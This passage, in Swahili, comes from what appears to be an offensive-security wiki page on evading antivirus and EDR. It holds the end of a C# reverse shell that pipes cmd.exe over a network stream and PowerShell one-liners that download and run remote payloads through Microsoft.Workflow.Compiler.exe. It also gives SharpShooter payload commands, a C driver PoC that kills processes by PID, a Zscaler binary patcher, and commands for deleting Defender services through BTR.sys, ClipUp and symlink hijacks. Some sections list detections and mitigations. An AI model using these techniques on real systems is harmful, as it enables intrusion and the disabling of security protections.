				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia Python kwa mfano wa kutengeneza injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine zaidi

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuzima AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia programu ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kusambaza ransomware. Zana hii huja na **driver yake yenye udhaifu lakini *iliyosainiwa*** na kuitumia vibaya kutekeleza shughuli za kernel zenye upendeleo ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu ya kuzingatia
1. **Driver iliyosainiwa**: Faili inayowasilishwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni driver iliyosainiwa kihalali ya `AToolsKrnl64.sys` kutoka “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver ina saini halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **kernel service** na wa pili huiwasha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na driver**
   | Msimbo wa IOCTL | Uwezo                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kukatisha mchakato wowote kwa PID (hutumika kuua huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili lolote kwenye diski |
   | `0x990001D0` | Kuondoa driver na kufuta service |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; msimbo unaotekelezwa kwenye kernel unaweza kufungua michakato *iliyolindwa*, kuisimamisha au kuingilia objects za kernel bila kujali PPL/PP, ELAM au vipengele vingine vya hardening.

Ugunduzi / Kupunguza Hatari
•  Washa orodha ya Microsoft ya madereva hatari yaliyozuiwa (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa huduma mpya za *kernel* na utoe tahadhari dereva anapopakiwa kutoka kwenye directory inayoweza kuandikiwa na kila mtu au hayupo kwenye allow-list.
•  Fuatilia handles za user-mode kwenye device objects maalum, zikifuatiwa na miito ya `DeviceIoControl` inayotia shaka.

### Kupita Ukaguzi wa Hali ya Kifaa wa Zscaler Client Connector kwa Kurekebisha Binary Iliyo Hifadhiwa Kwenye Diski

**Client Connector** ya Zscaler hutekeleza sheria za hali ya kifaa ndani ya kifaa na hutegemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguo mbili dhaifu za muundo huwezesha kupita ukaguzi kikamilifu:

1. Tathmini ya hali ya kifaa hufanyika **upande wa mteja pekee** (boolean hutumwa kwa seva).
2. Endpoints za ndani za RPC huthibitisha tu kwamba executable inayounganisha **imetia saini Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kurekebisha binaries nne zilizotiwa saini kwenye diski**, mifumo yote miwili inaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila mara, kwa hiyo kila ukaguzi hupita |
| `ZSAService.exe` | Mwito usio wa moja kwa moja wa `WinVerifyTrust` | Huwekwa NOP ⇒ mchakato wowote (hata ambao haujasainiwa) unaweza kuunganishwa kwenye mabomba ya RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa uadilifu wa tunnel | Hupitishwa kwa njia ya mkato |

Dondoo fupi la patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili asili na kuwasha upya stack ya huduma:

* **Ukaguzi wote** wa posture unaonyesha **green/compliant**.
* Binary ambazo hazijasainiwa au zimebadilishwa zinaweza kufungua endpoint za named-pipe RPC (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa hupata ufikiaji usio na vizuizi kwenye mtandao wa ndani unaofafanuliwa na sera za Zscaler.

Uchunguzi huu unaonyesha jinsi maamuzi ya uaminifu yanayofanywa upande wa client pekee na ukaguzi rahisi wa saini vinaweza kushindwa kwa marekebisho machache ya byte.

## Matumizi mabaya ya utendakazi unaoaminika wa Microsoft Defender `BTR.sys`

Driver ya Defender ya **Boot-Time Removal** ni mfano mzuri wa kulinganisha na BYOVD ya kawaida. `BTR.sys` ni sehemu halali ya kurekebisha mfumo iliyosainiwa na Microsoft, haina bug ya memory-corruption wala kiolesura cha IOCTL; baada ya kupata ufikiaji wa administrator na `SeLoadDriverPrivilege`, operator anaweza badala yake kughushi transaction yake binafsi ya kurekebisha mfumo na kupata utendakazi uliokusudiwa wa kufanya kazi kwenye faili/registry katika Ring-0. Hii ni **primitive ya kuzima AV/EDR baada ya compromise, si ya initial access au privilege escalation**, na driver inaweza kutolewa kutoka kwenye resource ya `BOOTTIMETOOL` ya `MpEngine.dll` ya target yenyewe, badala ya kuingiza driver ya mtu mwingine inayoweza kutia shaka.<sup>[[36]](#references)</sup>

### Kuweka driver ya matumizi ya mara moja

Kwa kawaida Defender huweka resource hiyo kama faili ya nasibu ya `[a-z]{8}.sys` na kusajili kernel service yenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya service, hufungua NTFS ADS iliyorejelewa, husimbua na kuthibitisha orodha ya vitendo, huandika feedback, kisha hurudisha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya utekelezaji kufanikiwa ili driver ijiondoe badala ya kubaki resident. Service iliyoghushiwa huwa na thamani zifuatazo za kipekee.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Mkondo wa `:changelist` una blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia tena ufunguo usiobadilika wa baiti 256, kwa hiyo usimbaji fiche si mpaka wa uidhinishaji. Plaintext halali ina header ya jumla ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC na transaction ID inayotokana na payload), ikifuatiwa na njia ya feedback ya UTF-16 inayoishia kwa null na idadi yoyote ya items. Kila item ina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data maalum kwa action inayoishia kwa **baiti nne za NUL haswa**. Kila eneo la header/data hukaguliwa kivyake kwa CRC-32 yenye polynomial `0xEDB88320`, hali ya mwanzo `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Vitambulisho vya action vinavyokubaliwa hufichua primitives hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya item | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, ikiwemo faili iliyofungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye path iliyolindwa iliyochaguliwa na mshambuliaji; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa key ya registry pamoja na yaliyomo ndani yake |
| 5 | `[Flags][key path + "\\" + value]` | Futa value ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha value ya registry na uunde njia za key ambazo hazipo |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye waya ni **backslash mbili zinazofuatana**; path iliyoandikwa kwa mpangilio wa kawaida haitatenganishwa ipasavyo. Faili ya feedback huakisi ombi kwa kiasi kikubwa, lakini baiti nne za kwanza za data ya kila item hubadilishwa kuwa `NTSTATUS` yake ya matokeo. Kwa actions 1 na 2, ambazo hazina sehemu ya flags inayoongoza, BTR huhamisha path hadi kwenye baiti nne za mwisho zilizohifadhiwa ili kutoa nafasi kwa status hiyo.<sup>[[36]](#references)</sup>

### Mtiririko wa kazi wa `BTR_CLI` na kipindi cha early-boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: kutoa `BTR.sys` kutoka kwa Defender ya ndani, kuunda `<random>.sys:changelist` na stream ya feedback, kuserilisha/kukokotoa checksum/kusimba actions zilizounganishwa, kuunda moja kwa moja key ya registry ya service, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha kama driver ya system-start kwa `-trigger boot`. Kuweka maandalizi moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW`, hivyo **hakutoi** Event ID 7045 ya usakinishaji wa service. Artifacts zilizoanzishwa wakati wa boot zinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haiwezi kutumika kwa sababu BTR hufanya I/O ya faili kutoka `DriverEntry` kabla stack ya hifadhi na link ya `SystemRoot` kuwa tayari. `Start=1` pamoja na kundi la kipaumbele cha juu la `Boot Bus Extender` hutekelezwa badala yake katika Phase 1: NTFS inaweza kutumika, lakini viendeshi vingi vya usalama vya system-start na huduma za EDR za user-mode bado hazijaanzishwa. Vichujio vya boot-start kama `WdFilter` huenda tayari vimepakiwa, lakini BTR inaweza kuondoa faili zao za binary au usanidi wa huduma kabla ya kuwasha tena, na inaweza kufuta faili za huduma zinazoweza kutekelezwa kabla SCM haijazizindua. ELAM haizibi pengo hili kwa sababu BTR huendeshwa baada ya tathmini ya boot-start na ina saini halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi hutekelezwa katika muamala mmoja. PoC huweka Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa moja kwa moja: BTR huunda logi hii, kisha hutekeleza ombi lake la kufuta na kuiondoa kabla haijashushwa. Hii hupunguza ushahidi, huku kuweka maoni katika `<random>.sys:<random>.dat` kukiruhusu kuondoa driver na streams zote mbili kwa pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Ulinganifu wa ugunduzi wenye ishara nyingi

Kanuni zinazotegemea saini pekee na orodha ya Microsoft ya madereva hatarishi yaliyopigwa marufuku hazizuii matumizi mabaya ya utendakazi uliokusudiwa wa BTR. Pendelea ulinganifu huu wa kitabia, huku ukitofautisha mfuatano halali wa Defender na programu yoyote ya uzinduzi.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Uundaji wa `.sys:changelist` hutokea kila wakati BTR inapowekwa tayari. ADS ya `.dat` iliyoambatishwa kwenye `.sys` hiyo hiyo inatia shaka zaidi, kwa sababu Defender halali kwa kawaida huweka maoni chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** Linganisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` wenye `Args=...:changelist` na `Group=Boot Bus Extender`, bila tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** Linganisha upakiaji wa driver ya BTR inayojulikana kutoka kwenye mfuatano usio wa Defender na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa kwa faili za binary za usalama.
- **Sysmon 11 -> 23:** Toa tahadhari kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na kagua ugawaji/uwezeshaji wa `SeLoadDriverPrivilege`; saini ya Microsoft pekee haitoshi kuthibitisha uaminifu wakati driver ya zana ya usalama inawekwa tayari na `cmd.exe`, PowerShell, au mchakato usiojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuhujumu AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza ngazi ya saini/kiwango ili michakato iliyolindwa iliyo na kiwango sawa au cha juu pekee iweze kuhujumiana. Kwa upande wa mashambulizi, ukiweza kuzindua kihalali binary iliyowezeshwa kwa PPL na kudhibiti hoja zake, unaweza kubadili utendakazi usio na madhara (kwa mfano, uwekaji wa logi) kuwa primitive ya uandishi yenye vizuizi, inayotumia PPL, dhidi ya folda zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL zozote zilizopakiwa) lazima isainiwe kwa EKU inayoweza kutumia PPL.
- Mchakato lazima uundwe kwa kutumia CreateProcess pamoja na flags hizi: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima iombwe protection level inayolingana na saini ya binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa saini za anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa saini za Windows). Viwango visivyo sahihi vitasababisha uundaji kushindwa.

Tazama pia utangulizi mpana zaidi wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za uzinduzi
- Zana saidizi ya open-source: CreateProcessAsPPL (huchagua protection level na kupeleka hoja kwa EXE lengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujizindua yenyewe na hukubali kigezo cha kuandika faili ya logi kwenye njia iliyobainishwa na mwito.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa ulinzi wa PPL.
- ClipUp haiwezi kuchanganua njia zilizo na nafasi; tumia njia fupi za 8.3 kuelekeza kwenye maeneo ambayo kwa kawaida hulindwa.

Visaidizi vya njia fupi za 8.3
- Orodhesha majina mafupi: `dir /x` katika kila saraka ya mzazi.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mnyororo wa matumizi mabaya (muhtasari)
1) Zindua LOLBIN inayoweza kutumia PPL (ClipUp) kwa kutumia `CREATE_PROTECTED_PROCESS` kupitia kizindua (kwa mfano, CreateProcessAsPPL).
2) Pitisha kigezo cha njia ya logi ya ClipUp ili kulazimisha uundaji wa faili katika saraka ya AV iliyolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 ikihitajika.
3) Ikiwa faili ya binary lengwa kwa kawaida huwa wazi/imefungwa na AV inapofanya kazi (kwa mfano, MsMpEng.exe), panga uandishi wakati wa kuwasha mfumo kabla ya AV kuanza kwa kusakinisha huduma ya kujianzisha kiotomatiki inayoendeshwa mapema kwa uhakika. Thibitisha mpangilio wa kuwasha mfumo ukitumia Process Monitor (boot logging).
4) Baada ya kuwasha upya, uandishi unaolindwa na PPL hufanyika kabla AV haijafunga faili zake za binary, na kuharibu faili lengwa na kuzuia AV kuanza.

Mfano wa amri ya uzinduzi (njia zimefichwa/zimefupishwa kwa usalama):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Vidokezo na vikwazo
- Huwezi kudhibiti maudhui ambayo ClipUp huandika, ila mahali yanapoandikwa; primitive hii inafaa kwa kuharibu data badala ya kuingiza maudhui mahususi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na fursa ya kuwasha upya.
- Muda ni muhimu: target haipaswi kuwa wazi; execution wakati wa kuwasha mfumo huepusha kufungwa kwa faili.

Ugunduzi
- Uundaji wa process ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa imeanzishwa na launchers zisizo za kawaida, wakati wa kuwasha mfumo.
- Services mpya zilizosanidiwa kuanzisha binaries zinazotiliwa shaka kiotomatiki na zinazoanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa Defender kuanza.
- Ufuatiliaji wa uadilifu wa faili kwenye binaries/Platform directories za Defender; uundaji/urekebishaji usiotarajiwa wa faili na processes zenye protected-process flags.
- Telemetry ya ETW/EDR: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Hatua za kupunguza hatari
- WDAC/Code Integrity: zuia ni binaries zipi zilizosainiwa zinaweza kuendeshwa kama PPL na chini ya parents zipi; zuia uanzishaji wa ClipUp nje ya mazingira halali.
- Usimamizi wa services: zuia uundaji/urekebishaji wa services zinazojiendesha wakati wa kuwasha mfumo na fuatilia udanganyifu wa mpangilio wa kuanza.
- Hakikisha ulinzi wa Defender dhidi ya kuchezewa na ulinzi wa early-launch umewashwa; chunguza hitilafu za uanzishaji zinazoashiria kuharibika kwa binary.
- Fikiria kuzima uundaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa mazingira yako yanaruhusu (jaribu kwa kina).

## Kuhujumu Microsoft Defender kupitia Utekaji wa Symlink wa Folda ya Toleo la Platform

Windows Defender huchagua platform itakayotumia kwa kuorodhesha folda ndogo zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua folda ndogo yenye mfuatano wa toleo ulio juu zaidi kwa mpangilio wa leksikografia (kwa mfano, `4.18.25070.5-0`), kisha huanzisha processes za service ya Defender kutoka hapo (na kusasisha paths za service/registry ipasavyo). Uteuzi huu huamini entries za directory, ikijumuisha directory reparse points (symlinks). Msimamizi anaweza kutumia hili kuelekeza Defender kwenye path inayoweza kuandikwa na mshambuliaji na kufanikisha DLL sideloading au kuvuruga service.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks ndani ya folda ya Platform)
- Uwezo wa kuwasha upya kompyuta au kulazimisha uteuzi upya wa Defender platform (service kuanza upya wakati wa kuwasha mfumo)
- Zana zilizojengewa ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandishi kwenye folda zake yenyewe, lakini uteuzi wake wa platform huamini entries za directory na kuchagua toleo la juu zaidi kwa mpangilio wa leksikografia bila kuthibitisha kuwa target inaelekezwa kwenye path inayolindwa/kuaminika.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikwa ya folda ya sasa ya platform, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink ya directory ya toleo la juu zaidi ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uchaguzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi wa service/registry unaoakisi eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Weka/替換 DLL ambazo Defender hupakia kutoka kwenye saraka yake ya programu ili kutekeleza code katika michakato ya Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Kuua service/kuzuia huduma: Ondoa version-symlink ili wakati wa kuwasha tena, njia iliyosanidiwa isitatuliwe na Defender ishindwe kuwaka:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kwamba mbinu hii haiinui mamlaka yenyewe; inahitaji haki za admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya target module yenyewe kwa kufanya hooking kwenye Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia code inayodhibitiwa na mshambuliaji na isiyotegemea mahali ilipo (PIC). Hii huongeza wigo wa evasion zaidi ya API chache ambazo kits nyingi hutoa (k.m., CreateProcessA), na kupanua ulinzi huohuo hadi kwenye BOFs na post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Weka PIC blob pamoja na target module kwa kutumia reflective loader (iliyotangulizwa au ya kuandamana nayo). PIC lazima ijitosheleze na isitegemee mahali ilipo.
- Host DLL inapopakiwa, pitia IMAGE_IMPORT_DESCRIPTOR yake na urekebishe IAT entries za imports lengwa (k.m., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) zielekeze kwenye thin PIC wrappers.
- Kila PIC wrapper hutekeleza evasions kabla ya kuita API halisi mwishoni. Evasions za kawaida ni pamoja na:
  - Kufunika/kufungua kumbukumbu wakati wa call (k.m., kusimba maeneo ya beacon, RWX→RX, kubadilisha majina/ruhusa za kurasa), kisha kurejesha baada ya call.
  - Call-stack spoofing: tengeneza stack isiyo na madhara na uhamie kwenye API lengwa ili uchanganuzi wa call-stack utambue frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa uoanifu, toa interface ili Aggressor script (au inayolingana nayo) iweze kusajili API za kufanya hooking kwa Beacon, BOFs na post-ex DLLs.

Kwa nini utumie IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia import iliyofanyiwa hooking, bila kurekebisha code ya zana au kutegemea Beacon kupitisha API maalum.
- Hushughulikia post-ex DLLs: kufanya hooking kwenye LoadLibrary* hukuwezesha kunasa upakiaji wa modules (k.m., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hiyo hiyo kwenye API calls zao.
- Hurejesha matumizi ya kuaminika ya amri za post-ex zinazozindua processes dhidi ya detections zinazotegemea call-stack, kwa kufunika CreateProcessA/W.

Mchoro mdogo wa IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr huonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo na salama kwa PIC; pata API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya patching au kupitia LdrGetProcedureAddress.
